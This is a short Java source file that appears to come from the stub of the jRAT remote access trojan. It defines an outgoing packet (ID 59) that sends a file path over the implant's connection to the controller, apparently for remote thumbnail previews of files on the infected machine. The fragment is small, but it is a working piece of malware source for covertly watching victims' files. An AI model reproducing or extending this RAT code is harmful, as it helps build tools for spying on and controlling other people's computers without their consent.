package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.stub.Connection;

import com.redpois0n.common.io.StringWriter;

public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
	
	private String file;

	public Packet59ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);
		
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 59;
	}

}
